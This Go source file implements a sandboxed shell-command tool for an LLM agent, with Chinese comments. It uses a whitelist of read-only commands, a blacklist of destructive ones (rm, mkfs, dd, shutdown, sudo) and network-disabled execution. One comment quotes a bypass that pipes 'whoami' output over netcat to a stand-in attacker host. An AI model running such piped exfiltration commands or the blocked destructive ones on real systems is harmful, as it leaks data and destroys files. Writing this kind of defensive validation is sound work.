package rag

import (
	"bytes"
	"context"
	"fmt"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

// SystemCommandTool 系统命令执行工具。
// 仅允许白名单内的安全只读命令，并通过沙箱（网络禁用 + 资源限制 + 非特权）降低风险。
type SystemCommandTool struct {
	timeout     time.Duration
	allowedCmds []string // 允许执行的命令白名单
	blockedCmds []string // 禁止执行的命令黑名单
	sandbox     bool     // 是否在受限子环境中执行（默认 true）
}

// NewSystemCommandTool 创建系统命令工具（默认开启沙箱）。
func NewSystemCommandTool() *SystemCommandTool {
	return &SystemCommandTool{
		timeout: 30 * time.Second,
		allowedCmds: []string{
			"ls", "dir", "pwd", "echo", "cat", "head", "tail",
			"wc", "grep", "find", "sort", "uniq", "cut",
			"date", "whoami", "hostname", "uname",
			"ps", "top", "df", "du", "free",
			"env", "which", "where", "type",
		},
		blockedCmds: []string{
			"rm", "del", "format", "mkfs", "fdisk",
			"shutdown", "reboot", "halt", "poweroff",
			"kill", "pkill", "taskkill",
			"sudo", "su", "admin",
			"chmod", "chown", "chgrp",
			"mount", "umount",
			"dd", "mv", "cp",
		},
		sandbox: true,
	}
}

// NewSystemCommandToolWithPolicy 按配置构造命令工具。
// allowed 为空时沿用内置只读命令集合；timeoutSeconds<=0 时用默认 30 秒。
func NewSystemCommandToolWithPolicy(allowed []string, timeoutSeconds int) *SystemCommandTool {
	t := NewSystemCommandTool()
	if timeoutSeconds > 0 {
		t.timeout = time.Duration(timeoutSeconds) * time.Second
		if t.timeout > 60*time.Second {
			t.timeout = 60 * time.Second
		}
	}
	if len(allowed) > 0 {
		normalized := make([]string, 0, len(allowed))
		for _, c := range allowed {
			if c = strings.ToLower(strings.TrimSpace(c)); c != "" {
				normalized = append(normalized, c)
			}
		}
		if len(normalized) > 0 {
			t.allowedCmds = normalized
		}
	}
	return t
}

// SetSandbox 开启/关闭命令执行沙箱。
func (t *SystemCommandTool) SetSandbox(enabled bool) {
	t.sandbox = enabled
}

// Definition 返回工具定义
func (t *SystemCommandTool) Definition() ToolDefinition {
	return ToolDefinition{
		Name:        "execute_command",
		Description: "在受限沙箱中执行系统只读命令，返回输出。禁止危险操作，禁用网络与写权限",
		Parameters: map[string]interface{}{
			"type": "object",
			"properties": map[string]interface{}{
				"command": map[string]interface{}{
					"type":        "string",
					"description": "要执行的系统命令",
				},
				"working_dir": map[string]interface{}{
					"type":        "string",
					"description": "工作目录（可选）",
				},
				"timeout": map[string]interface{}{
					"type":        "integer",
					"description": "超时时间（秒），默认30秒，最大60秒",
				},
			},
			"required": []string{"command"},
		},
	}
}

// Execute 执行系统命令
func (t *SystemCommandTool) Execute(ctx context.Context, params map[string]interface{}) (*ToolResult, error) {
	command, _ := params["command"].(string)
	if command == "" {
		return &ToolResult{
			ToolName: "execute_command",
			Success:  false,
			Error:    "缺少command参数",
		}, nil
	}

	// 解析工作目录
	workingDir, _ := params["working_dir"].(string)

	// 解析超时时间
	timeout := t.timeout
	if tf, ok := params["timeout"].(float64); ok && tf > 0 {
		sec := int(tf)
		if sec > 60 {
			sec = 60
		}
		timeout = time.Duration(sec) * time.Second
	}

	// 安全检查
	if err := t.validateCommand(command); err != nil {
		return &ToolResult{
			ToolName: "execute_command",
			Success:  false,
			Error:    fmt.Sprintf("安全检查失败: %v", err),
		}, nil
	}

	// 创建上下文（带超时）
	ctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()

	// 构造命令（含沙箱包装）
	cmd := t.buildCommand(ctx, command, workingDir)

	// 捕获输出
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	// 执行命令
	err := cmd.Run()

	// 检查是否超时
	if ctx.Err() == context.DeadlineExceeded {
		return &ToolResult{
			ToolName: "execute_command",
			Success:  false,
			Error:    fmt.Sprintf("命令执行超时（%v）", timeout),
		}, nil
	}

	result := fmt.Sprintf("命令: %s\n", command)
	if workingDir != "" {
		result += fmt.Sprintf("工作目录: %s\n", workingDir)
	}
	result += fmt.Sprintf("退出码: ")

	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			result += fmt.Sprintf("%d\n", exitErr.ExitCode())
		} else {
			result += fmt.Sprintf("错误: %v\n", err)
		}
	} else {
		result += "0\n"
	}

	if stdout.Len() > 0 {
		output := stdout.String()
		if len(output) > 100*1024 {
			output = output[:100*1024] + "\n... (输出已截断)"
		}
		result += fmt.Sprintf("\n标准输出:\n%s", output)
	}

	if stderr.Len() > 0 {
		result += fmt.Sprintf("\n标准错误:\n%s", stderr.String())
	}

	tr := &ToolResult{
		ToolName: "execute_command",
		Success:  err == nil,
		Result:   result,
	}
	// 旧实现在成功路径也无条件调用 err.Error()，err 为 nil 接口时必然 panic；
	// 该工具在流式 Agent 的裸 goroutine 里执行（无 recover），一次成功就会击穿整个进程。
	if err != nil {
		tr.Error = err.Error()
	}
	return tr, nil
}

// buildCommand 根据沙箱开关构造最终执行的命令。
// Linux 下通过 unshare 禁用网络命名空间；Windows 退化为直接 shell（仍有白/黑名单保护）。
func (t *SystemCommandTool) buildCommand(ctx context.Context, command, workingDir string) *exec.Cmd {
	if runtime.GOOS == "windows" || !t.sandbox {
		if runtime.GOOS == "windows" {
			return exec.CommandContext(ctx, "cmd", "/C", command)
		}
		return exec.CommandContext(ctx, "sh", "-c", command)
	}

	// Linux/macOS：在禁用网络的子命名空间中执行，附加资源 ulimit。
	wrapped := fmt.Sprintf("ulimit -v 262144 -t 30 -f 10240; %s", command)
	return exec.CommandContext(ctx, "unshare", "--net", "sh", "-c", wrapped)
}

// validateCommand 验证命令是否安全。
//
// 旧实现只校验第一个 token，并对「整串里出现 grep/sort/head/tail」的情况整体放过 `|`，
// 于是 `whoami | grep a | nc attacker 4444` 能通过校验并被 sh -c 执行 —— 等价任意命令执行。
// 现在按 shell 分隔符切段，每一段的可执行程序都必须通过白名单与黑名单。
func (t *SystemCommandTool) validateCommand(command string) error {
	if strings.TrimSpace(command) == "" {
		return fmt.Errorf("命令为空")
	}
	if strings.ContainsAny(command, "\n\r") {
		return fmt.Errorf("命令不允许包含换行")
	}
	// 重定向、命令替换与变量展开一律禁止（`&` 与 `|`、`;` 作为分隔符在下方逐段校验）
	for _, bad := range []string{">", "<", "`", "$(", "${", "$["} {
		if strings.Contains(command, bad) {
			return fmt.Errorf("命令包含危险字符: %s", bad)
		}
	}

	segments := strings.FieldsFunc(command, func(r rune) bool {
		return r == '|' || r == ';' || r == '&'
	})
	if len(segments) == 0 {
		return fmt.Errorf("命令为空")
	}

	for _, seg := range segments {
		fields := strings.Fields(seg)
		if len(fields) == 0 {
			continue
		}
		cmdName := strings.ToLower(fields[0])
		if idx := strings.LastIndex(cmdName, "/"); idx >= 0 {
			cmdName = cmdName[idx+1:]
		}
		if idx := strings.LastIndex(cmdName, "\\"); idx >= 0 {
			cmdName = cmdName[idx+1:]
		}

		for _, blocked := range t.blockedCmds {
			if cmdName == blocked {
				return fmt.Errorf("禁止执行危险命令: %s", cmdName)
			}
		}
		if len(t.allowedCmds) > 0 {
			allowed := false
			for _, cmd := range t.allowedCmds {
				if cmdName == cmd {
					allowed = true
					break
				}
			}
			if !allowed {
				return fmt.Errorf("命令 %s 不在允许的命令列表中", cmdName)
			}
		}
	}

	return nil
}
